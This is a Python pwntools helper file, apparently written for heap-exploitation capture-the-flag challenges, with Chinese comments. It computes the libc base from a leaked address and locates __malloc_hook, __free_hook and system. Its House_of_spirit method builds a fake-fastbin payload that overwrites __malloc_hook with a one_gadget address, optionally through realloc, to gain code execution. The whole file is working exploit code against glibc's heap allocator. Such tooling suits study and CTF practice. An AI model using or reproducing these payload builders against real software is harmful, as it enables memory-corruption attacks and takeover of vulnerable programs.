from pwn import *
import os
# def menu(glb):
#     """
#     heap题的menu
#     """
#     # 这里我原来想通过 g = globals(); g = glb来把main里面的各个函数传递到这里，但是后来发现我想错了
#     # 因为g = glb这种写法就是把g当成一个指针，并没有改变当前的globals()
#     # 所以只有通过g.update(glb)这种方式才能把字典复制过来，
#     # 但是我感觉开销略大所以还是直接一个个赋值吧
    
#     sla = glb['sla']
#     sa = glb['sa']
#     bt = glb['bt']
#     ru = glb['ru']
#     sl = glb['sl']
#     s = glb['s']


        
#     glb['add'] = add
#     glb['free'] = free
#     glb['show'] = show
#     glb['edit'] = edit


class heap_helper:
    def __init__(self, libc, key, value):
        self.libc = libc
        if key in ['main_arena']:
            self.main_arena = value
            self.__malloc_hook = self.main_arena-0x10
            self.base_addr = value - 0x10 - self.libc.sym['__malloc_hook']
        elif key in libc.sym:
            self.base_addr = value - self.libc.sym[key]

        self.libc.address = self.base_addr
        self.malloc_hook = libc.sym["__malloc_hook"]
        self.free_hook = libc.sym["__free_hook"]
        self.system = libc.sym["system"]
        self.main_arena = self.malloc_hook + 0x10
        self.fake_fb_trunk = self.malloc_hook - 0x23
        success(f"main_arena | {hex(self.main_arena)}")
        success(f"libc_base | {hex(self.libc.address)}")
        success(f"malloc_hook | {hex(self.malloc_hook)}")
        success(f"free_hook | {hex(self.free_hook)}")
        
    def House_of_spirit(self, one_gadget, realloc=False):
        """
        fill fake trunk with one_gadget
        args:
            one_gadget: int (0x4526a)
            realloc:    whether 2 use realloc
        libc:
            addr-8: realloc_hook
            addr:   malloc_hook
        """
        info(f"fake_trunk_addr: {hex(self.fake_fb_trunk)}")
        info(f"malloc_hook_addr: {hex(self.malloc_hook)}")
        if realloc:
            payload = b"\x00"*11 + p64(self.libc.address+one_gadget)+ p64(self.libc.sym['realloc'])
        else:
            payload = b"\x00"*0x13 + p64(self.libc.address+one_gadget)
        success("og: "+hex(self.libc.address+one_gadget))
        return payload